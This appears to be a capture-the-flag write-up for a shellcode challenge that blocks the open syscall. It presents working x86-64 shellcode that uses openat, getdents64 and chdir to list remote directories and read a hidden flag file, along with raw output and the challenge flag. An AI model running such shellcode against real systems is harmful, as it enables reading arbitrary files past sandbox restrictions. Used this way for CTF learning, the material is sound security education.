### Step 1, using openat to open, read and write a file
Since `open` syscall was not allowed, we are using `openat`, here is the shellcode that makes use of `openat` to read and write out content of a file:
```py
shellcode = asm('''
    /* Openat */
    mov rdi, -100       /* AT_FDCWD (current directory) */
    lea rsi, [rip+flag] /* pointer to filename */
    xor rdx, rdx        
    xor r10, r10        
    mov rax, 257
    syscall

    /* Read */
    mov rdi, rax        
    mov rax, 0          
    sub rsp, 100        
    mov rsi, rsp        
    mov rdx, 100        
    syscall

    /* Write */
    mov rdx, rax        
    mov rax, 1          
    mov rdi, 1          
    mov rsi, rsp        
    syscall


flag:
    .string "./flag.txt"
''')
```


### Step 2, `getdents64` to print out directory entries
As you can see from above that I am trying to open `./flag.txt`, which worked at my local environment but not when connecting to the remote challenge.

That means I am likely opening nothing so the file name of the flag file is probably not `./flag.txt`.

Therefore, I planned to do a `ls` on the remote directory to take a look at the the file and directories names.
After a quick google, I got to know that `getdents64` syscall does the work. It prints the directory entries. Here is the code that print out the directory entries of a desired directory.

```py
shellcode = asm('''
    /* Open a directory using openat */
    mov rax, 257        /* openat syscall */
    mov rdi, -100       /* AT_FDCWD (current directory) */
    lea rsi, [rip+dir]  /* pointer to the dirrectory string */
    xor rdx, rdx        
    xor r10, r10     
    syscall
    
    /* Save fd*/
    mov r12, rax
    
    /* Allocate buffer on stack for directory entries */
    sub rsp, 1024
    mov rbp, rsp        /* Save buffer address in rbp */
    
    /* Use getdents64 to do ls */
    mov rax, 217        /* getdents64 */
    mov rdi, r12        /* fd */
    mov rsi, rbp        /* buffer address */
    mov rdx, 1024       /* buffer size */
    syscall
    
    /* Save number of bytes read */
    mov r13, rax
    
    /* write */
    mov rax, 1          
    mov rdi, 1          
    mov rsi, rbp        
    mov rdx, r13        
    syscall

dir:
    .string "." /* Current directory, adjust this to "./secret" later to see stuff inside secret */
''')
```
Here is the output of the above shellcode:
```
Input your shellcode here (max: 100): b\x02\x18\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04.\x00w\x00\x00\xba$\x10\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04sys\x00\x00\xdf\x0b\x12\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04var\x00\x00\xb3$\x10\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04run\x00\x00\xcd3\x10\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04tmp\x00\x00\x16P\x10\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04usr\x00\x00\xf3#\x10\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x18\x00
bin\x00\x00\xb9$\x10\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04srv\x00/\xae$\x10\x00\x00\x00\x00\x00  \x00\x00\x00\x00\x00\x00\x00\x18\x00\x04opt\x00/\xad$\x10\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04mnt\x00\x00\x13\x0c\x12\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04home\x00M\x02\x18\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04etc\x00\x00\xa9$\x10\x\x00\x00\x00\x00\x00\x00\x00 \x00
lib32\x00\x00\x00\x00\x00\x00\x00\x00\xb8$\x10\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x00\x00\x18\x00
sbin\x00J\x02\x18\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04..\x00\x00\x00\xa8$\x10\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x18\x00
lib\x00\x00\xaf$\x10\x00\x00\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04proc\x00\xab$\x10\x00\x00\x00\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00 \x00
libx32\x00\x00\x00\x00\x00\x00\x00\xac$\x10\x00\x00\x00\x00\x00\x13\x00\x00\x00\x00\x00\x00\x00 \x00\x04media\x00\x00\x00\x00\x00\x00\x00\x00\xf4#\x10\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04boot\x00\xaa$\x10\x00\x00\x00\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00 \x00
lib64\x00\x00\x00\x00\x00\x00\x00\x00\xb0$\x10\x00\x00\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04root\x00T\x02\x18\x00\x00\x00\x00\x00\x17\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04dev\x00\x00]\x02\x18\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00 \x00\x08.dockerenv\x00\x00\x00\xfd\x0b\x12\x00\x00\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00 \x00\x04secret\x00\x00\x00\x00\x00\x00\x00$
```

Having entries like `\tmp\` and `\proc` implies that we are at the root directory. But the most important thing is that there is something named `secret`. Therefore, changing the `dir` string of the above shellcode from being `"."` to being `"./secret"` so that we can see the things inside secret and dig further down.

From:
```
dir:
    .string "." /* Current directory, adjust this to "./secret" later to see stuff inside secret */
```

To:
```
dir:
    .string "./secret" /* Current directory, adjust this to "./secret" later to see stuff inside secret */
```


Then, we are able to see stuff inside `./secret`:
```
Input your shellcode here (max: 100): \xfd\x0b\x12\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04.\x00y\x00\x00\xf6\x0b\x12\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x18\x00\x04..\x00\x00\x00\xfe\x0b\x12\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00(\x00\x08CDr46w9anrq3vg0Z\x00\x00\x00\x00\x00$
```
Here we got something interesting `CDr46w9anrq3vg0Z`. But I am not sure whether it's a file or directory, I treated it as a directory first and tried going inside of it but failed. So, it seemed to be a file.


### Step 3, chdir to secret and open CDr46w9anrq3vg0Z
So I decided to change the remote directory from being root to go inside of `./secret` so that I can open `CDr46w9anrq3vg0Z`. Here is the shellcode that does the work:
```
shellcode = asm('''
    /* Change to the secret directory */
    push 80
    pop rax
    lea rdi, [rip+secret] /* pointer to "./secret" */
    syscall
    
    /* Openat */
    push 257
    pop rax
    mov rdi, -100       /* dirfd: AT_FDCWD */
    lea rsi, [rip+file] /* pointer to "CDr46w9anrq3vg0Z" */
    xor edx, edx        
    syscall

    /* Read and write in one step */
    push rax
    pop rdi
    xor eax, eax        
    sub rsp, 64        
    mov rsi, rsp        
    mov rdx, 64         
    syscall
    
    /* Write to stdout */
    push rax
    pop rdx
    mov rax, 1         
    mov rdi, 1          
    syscall

secret:
    .string "./secret"  /* First string at offset 0 */
file:    
    .string "CDr46w9anrq3vg0Z" /* Second string at offset 8 */
''')
```
Basically, it is the combination of `chdir` syscall and the very first shellcode, the sequence of `openat`, `read` and `write` syscalls with a bit of modification such as replacing the `mov` instructions to `push` and `pop` instructions as the shellcode is limited by size as well. And guess what, with the above shellcode, opening `CDr46w9anrq3vg0Z` got me the flag.

### Flag
```
PUCTF25{n0w_y0u_kn0w_h0w_70_u53_5y5c4ll_70_l5_pOATie8rkE0Ewiv7Lp}
```
